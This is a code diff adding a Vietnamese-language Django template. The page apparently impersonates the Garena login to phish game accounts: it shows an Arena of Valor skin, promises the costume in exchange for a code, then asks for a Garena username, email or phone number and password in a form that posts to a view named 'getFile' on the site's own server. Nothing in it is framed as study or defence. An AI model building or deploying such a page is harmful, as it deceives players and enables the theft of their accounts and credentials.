@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    {% load static %}
+    <title></title>
+    <link rel="stylesheet" type="text/css" href="{% static 'dangnhap1/garena.css' %}">
+<body>
+    <div id="img">
+        <img src="/media/Tulen - Chí tôn kiếm tiên.jpg" style="height: 1080px;">
+    </div>
+    <div id="code">
+        <h2>Vui lòng nhập mã CODE để nhận trang phục</h2>
+        <input type="text">
+    </div>
+    <form action="{% url 'dangnhap1:getFile' %}" method="post">
+        {% csrf_token %}
+        <div id="login">
+            <img src="/media/kk.png" style="height: 70px;">
+            <h2>Đăng nhập</h2>
+            <input type="text" placeholder="Tài khoản Garena,Email hoặc số điện thoại" name ="username" >
+            <input type="password" placeholder="Password" name ="Mật khẩu" >
+            <button type="submit"><b>Đăng nhập ngay</b></button>
+            <p>Quên mật khẩu ?</p>
+        </div>
+    </form>
+</body>
+</html>
